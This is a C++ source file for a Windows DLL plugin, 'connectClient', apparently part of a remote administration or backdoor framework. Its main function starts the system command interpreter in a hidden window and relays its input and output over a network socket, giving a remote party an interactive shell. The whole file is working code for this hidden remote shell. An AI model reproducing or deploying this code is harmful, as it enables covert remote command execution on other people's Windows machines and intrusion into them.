// client_basePlugin.cpp : 定义 DLL 的导出函数。
//

#include "pch.h"
#include "framework.h"
#include "client_basePlugin.h"
#include "..\include\globalDefine.h"
#include "..\include\serverStruct.h"
#include "..\include\fliter.h"
class connectClient : public PluginNamespace::pluginBase
{
public:
	bool runFun(PluginNamespace::Info& info) override
	{
		std::shared_ptr<programPluginInfoStruct>& funInfo = (std::shared_ptr<programPluginInfoStruct> &)(info.customize_data[0]);
		return (open_telnet(*(funInfo->mainConnectSocket)) == SUCCESS_STATUS);
	}
	connectClient()
	{
		this->used = true;
		this->show = true;
		this->pluginName = "connectClient";
		this->version = "1.0.0";
		this->author = "x3fang";
	}

private:
	int open_telnet(SOCKET& socket)
	{
		PROCESS_INFORMATION Processinfo;
		STARTUPINFOA Startupinfo;
		HANDLE outputRead, outputWrite;
		HANDLE inputRead, inputWrite;
		SECURITY_ATTRIBUTES sa = { 0 };
		char szCMDPath[255] = { 0 };
		DWORD dwBytesRead = 0;
		DWORD dwBytesWrite = 0;

		sa.nLength = sizeof(sa);
		sa.bInheritHandle = TRUE;
		sa.lpSecurityDescriptor = NULL;

		if (!CreatePipe(&outputRead, &outputWrite, &sa, 0) || !CreatePipe(&inputRead, &inputWrite, &sa, 0))
			return GetLastError();

		ZeroMemory(&Processinfo, sizeof(PROCESS_INFORMATION));
		ZeroMemory(&Startupinfo, sizeof(STARTUPINFO));
		GetEnvironmentVariableA("COMSPEC", szCMDPath, sizeof(szCMDPath));

		Startupinfo.cb = sizeof(STARTUPINFOA);
		Startupinfo.wShowWindow = SW_HIDE;
		Startupinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		Startupinfo.hStdInput = (HANDLE)inputRead;
		Startupinfo.hStdOutput = (HANDLE)outputWrite;
		Startupinfo.hStdError = (HANDLE)outputWrite;

		if (CreateProcessA(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &Startupinfo, &Processinfo))
		{
			CloseHandle(outputWrite);
			CloseHandle(inputRead);
			std::string buf;
			buf = readPipeALLData(outputRead).first;
			send(socket, buf);
			while (WAIT_OBJECT_0 != WaitForSingleObject(Processinfo.hProcess, 5))
			{
				recv(socket, buf);
				buf += "\r\n";
				WriteFile(inputWrite, buf.c_str(), static_cast<int>(strlen(buf.c_str())), &dwBytesWrite, NULL);
				if (WAIT_OBJECT_0 != WaitForSingleObject(Processinfo.hProcess, 5))
				{
					buf = readPipeALLData(outputRead).first;
					send(socket, buf);
				}
				else
				{
					send(socket, "\r\n[exit]\r\n");
					break;
				}
			}
		}
		else
		{
			CloseHandle(Processinfo.hProcess);
			CloseHandle(Processinfo.hThread);
			return GetLastError();
		}

		CloseHandle(Processinfo.hProcess);
		CloseHandle(Processinfo.hThread);
		return SUCCESS_STATUS;
	}
	std::pair<std::string, DWORD> readPipeALLData(HANDLE outputRead, int timeout_ms = 100)
	{
		std::string res;
		char cbuf[2048] = { 0 };
		DWORD dwBytesRead = 0, bytesAvailable = 0;
		do
		{
			if (PeekNamedPipe(outputRead, NULL, 0, NULL, &bytesAvailable, NULL))
			{
				if (bytesAvailable > 0)
				{
					if (ReadFile(outputRead, cbuf, sizeof(cbuf) - 1, &dwBytesRead, NULL) != TRUE)
					{
						continue;
					}
					res += cbuf;
					if (dwBytesRead == 0)
						break;
				}
			}
			if (timeout_ms <= 0)
				break;
			else if (timeout_ms - 10 <= 0)
				Sleep(timeout_ms);
			else
				Sleep(10);
			timeout_ms -= 10;

			memset(cbuf, 0, sizeof(cbuf));
		} while (timeout_ms > 0);

		memset(cbuf, 0, sizeof(cbuf));

		return make_pair(res, dwBytesRead);
	}
};
static connectClient Plugin_connectClient;
extern "C"
{
	EXPORT bool registerFun(PluginNamespace::PluginManager& pluginManager)
	{
		return pluginManager.registerFun(&Plugin_connectClient).first;
	}
}